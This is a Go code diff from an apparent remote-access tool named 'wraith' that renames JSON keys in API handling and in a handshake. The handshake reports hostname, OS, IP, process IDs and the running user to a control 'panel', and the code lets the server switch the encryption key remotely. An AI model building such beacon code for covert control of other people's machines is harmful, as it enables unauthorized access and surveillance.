@@ -351,7 +351,7 @@ func (wraith *wraithStruct) API(requestData interface{}) (APIResponse map[string
 	}
 
 	// Verify that the API fingerprint is present and trusted
-	if APIFingerprint, ok := finalResponse["api_fingerprint"]; ok {
+	if APIFingerprint, ok := finalResponse["APIFingerprint"]; ok {
 		if APIFingerprint != wraith.TrustedAPIFingerprint {
 			return nil, errors.New("api provided untrusted fingerprint")
 		}
@@ -359,8 +359,8 @@ func (wraith *wraithStruct) API(requestData interface{}) (APIResponse map[string
 		return nil, errors.New("api did not identify itself")
 	}
 
-	// If an API response contains the `switch_key`, set the encryption key to it
-	if switchKey, ok := finalResponse["switch_key"]; ok {
+	// If an API response contains the `switchKey`, set the encryption key to it
+	if switchKey, ok := finalResponse["switchKey"]; ok {
 		wraith.CryptKey = fmt.Sprint(switchKey)
 	}
 
@@ -406,22 +406,22 @@ func (wraith *wraithStruct) Handshake() error {
 
 	// Create data required by the panel for logging in
 	data := map[string]interface{}{
-		"req_type": "handshake",
-		"host_info": map[string]interface{}{
-			"arch":        "",
-			"hostname":    hostname,
-			"os_type":     "",
-			"os_version":  "",
-			"reported_ip": "",
+		"reqType": "handshake",
+		"hostInfo": map[string]interface{}{
+			"arch":       "",
+			"hostname":   hostname,
+			"osType":     "",
+			"osVersion":  "",
+			"reportedIP": "",
 		},
-		"wraith_info": map[string]interface{}{
-			"version":      "",
-			"start_time":   "",
-			"plugins":      "",
-			"env":          "",
-			"pid":          "",
-			"ppid":         "",
-			"running_user": "",
+		"wraithInfo": map[string]interface{}{
+			"version":     "",
+			"startTime":   "",
+			"plugins":     "",
+			"env":         "",
+			"pid":         "",
+			"ppid":        "",
+			"runningUser": "",
 		},
 	}
 
